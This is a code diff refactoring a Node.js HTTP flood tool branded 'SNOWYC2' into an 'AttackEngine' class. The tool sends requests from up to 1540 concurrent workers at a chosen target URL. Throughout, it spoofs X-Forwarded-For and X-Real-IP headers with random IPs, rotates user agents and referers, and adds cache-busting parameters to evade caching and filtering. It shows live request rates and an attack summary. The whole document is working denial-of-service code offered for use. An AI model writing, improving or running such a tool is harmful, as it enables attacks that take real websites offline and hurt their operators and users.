@@ -5,74 +5,153 @@ const http = require('http');
 const https = require('https');
 const process = require('process');
 
-const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1540);
-const MAX_REQUESTS_PER_WORKER = 5000;
-const STREAMS = 4;
+const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1540); // adjust if needed
 const REQUEST_TIMEOUT = 8000;
 
-const USER_AGENTS = fs.readFileSync('ua.txt', 'utf8')
-    .split('\n')
-    .map(u => u.trim())
-    .filter(Boolean);
+function loadLines(filename) {
+    try {
+        return fs.readFileSync(filename, 'utf8')
+            .split('\n')
+            .map(line => line.trim())
+            .filter(line => line.length > 0);
+    } catch {
+        return [];
+    }
+}
 
-const REFERERS = fs.readFileSync('refs.txt', 'utf8')
-    .split('\n')
-    .map(r => r.trim())
-    .filter(Boolean);
+const REFERERS = loadLines('refs.txt');
+const USER_AGENTS = loadLines('ua.txt');
+
+const UA_POOL = Array.from({ length: 10000 }, () =>
+    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');
 
 const keepAliveHttp = new http.Agent({ keepAlive: true });
 const keepAliveHttps = new https.Agent({ keepAlive: true });
 
-const getRandomUA = () => {
-    const ua1 = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
-    const ua2 = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
-    return `${ua1}, ${ua2}`;
-};
+class AttackEngine {
+    constructor(target, duration) {
+        this.target = target;
+        this.duration = duration * 1000;
+        this.startTime = Date.now();
+        this.stats = {
+            total: 0,
+            success: 0,
+            errors: 0,
+            peakRps: 0
+        };
+        this.uaIndex = 0;
+        this.running = true;
+    }
 
-const getRandomReferer = () => {
-    return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
-};
+    getRandomUA() {
+        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
+        return UA_POOL[this.uaIndex];
+    }
 
-const makeRequest = (target, stats) => {
-    const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
-    const headers = {
-        'User-Agent': getRandomUA(),
-        'Referer': getRandomReferer(),
-        'X-Forwarded-For': randomIP,
-        'X-Real-IP': randomIP,
-        'Accept': '*/*',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache',
-        'Connection': 'keep-alive'
-    };
+    getRandomReferer() {
+        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
+    }
 
-    const urlWithNoise = target + (target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
+    async makeRequest() {
+        const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
+        const headers = {
+            'User-Agent': this.getRandomUA(),
+            'Referer': this.getRandomReferer(),
+            'X-Forwarded-For': randomIP,
+            'X-Real-IP': randomIP,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        };
 
-    axios.get(urlWithNoise, {
-        headers,
-        timeout: REQUEST_TIMEOUT,
-        httpAgent: keepAliveHttp,
-        httpsAgent: keepAliveHttps,
-        validateStatus: null
-    }).then(res => {
-        stats.success++;
-    }).catch(() => {
-        stats.errors++;
-    }).finally(() => {
-        stats.total++;
-    });
-};
+        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
 
-const startWorker = async (target, stats) => {
-    for (let sent = 0; sent < MAX_REQUESTS_PER_WORKER; sent += STREAMS) {
-        for (let i = 0; i < STREAMS; i++) {
-            makeRequest(target, stats);
+        try {
+            const isHttps = this.target.startsWith('https');
+            const response = await axios.get(urlWithNoise, {
+                headers,
+                timeout: REQUEST_TIMEOUT,
+                httpAgent: keepAliveHttp,
+                httpsAgent: keepAliveHttps,
+                validateStatus: null
+            });
+            if (response.status === 200) {
+                this.stats.success++;
+                return;
+            }
+        } catch {
+            // ignored
+        }
+
+        this.stats.errors++;
+    }
+
+    async startWorkers() {
+        const workers = [];
+        for (let i = 0; i < MAX_CONCURRENT; i++) {
+            workers.push(this.workerLoop());
+        }
+        await Promise.all(workers);
+    }
+
+    async workerLoop() {
+        while (this.running && Date.now() - this.startTime < this.duration) {
+            this.stats.total++;
+            await this.makeRequest();
         }
     }
-};
 
+    async runAttack() {
+        const showIntro = () => {
+            console.clear();
+            console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
+            console.log('  ============================================');
+            console.log(`  TARGET: ${this.target}`);
+            console.log(`  TIME:   ${this.duration / 1000}s`);
+            console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
+            console.log('  ============================================\n');
+        };
+
+        showIntro();
+
+        let lastTotal = 0;
+        const printStats = setInterval(() => {
+            const elapsed = (Date.now() - this.startTime) / 1000;
+            const currentRps = (this.stats.total - lastTotal) / 0.2;
+            lastTotal = this.stats.total;
+            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
+
+            process.stdout.write(
+                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
+            );
+        }, 200);
+
+        await this.startWorkers();
+        this.running = false;
+        clearInterval(printStats);
+        this.printSummary();
+    }
+
+    printSummary() {
+        const elapsed = (Date.now() - this.startTime) / 1000;
+        const avgRps = this.stats.total / elapsed;
+        console.log('\n\n  ATTACK FINISHED');
+        console.log('  ============================================');
+        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
+        console.log(`  TOTAL:       ${this.stats.total}`);
+        console.log(`  SUCCESS:     ${this.stats.success}`);
+        console.log(`  ERRORS:      ${this.stats.errors}`);
+        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
+        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
+        console.log('  ============================================\n');
+    }
+}
+
+// Main
 (async () => {
     const readline = require('readline').createInterface({
         input: process.stdin,
@@ -96,52 +175,10 @@ const startWorker = async (target, stats) => {
         return;
     }
 
-    const stats = {
-        total: 0,
-        success: 0,
-        errors: 0,
-        peakRps: 0
-    };
-
-    const startTime = Date.now();
-    const endTime = startTime + duration * 1000;
-
-    console.clear();
-    console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
-    console.log('  ============================================');
-    console.log(`  TARGET: ${target}`);
-    console.log(`  TIME:   ${duration}s`);
-    console.log(`  MODE:   HYPER BLITZ - ${MAX_CONCURRENT} Workers × ${STREAMS} Streams`);
-    console.log('  ============================================\n');
-
-    let lastTotal = 0;
-    const statInterval = setInterval(() => {
-        const currentRps = (stats.total - lastTotal) / 0.2;
-        lastTotal = stats.total;
-        stats.peakRps = Math.max(stats.peakRps, currentRps);
-        process.stdout.write(
-            `\r  SENT: ${stats.total} | 200 OK: ${stats.success} | ERR: ${stats.errors} | RPS: ${currentRps.toFixed(1)} `
-        );
-    }, 200);
-
-    const workers = [];
-    for (let i = 0; i < MAX_CONCURRENT; i++) {
-        workers.push(startWorker(target, stats));
+    const engine = new AttackEngine(target, duration);
+    try {
+        await engine.runAttack();
+    } catch (err) {
+        console.error("Attack failed:", err.message);
     }
-
-    await Promise.all(workers);
-    clearInterval(statInterval);
-
-    const elapsed = (Date.now() - startTime) / 1000;
-    const avgRps = stats.total / elapsed;
-
-    console.log('\n\n  ATTACK FINISHED');
-    console.log('  ============================================');
-    console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
-    console.log(`  TOTAL:       ${stats.total}`);
-    console.log(`  SUCCESS:     ${stats.success}`);
-    console.log(`  ERRORS:      ${stats.errors}`);
-    console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
-    console.log(`  PEAK RPS:    ${stats.peakRps.toFixed(1)}`);
-    console.log('  ============================================\n');
 })();
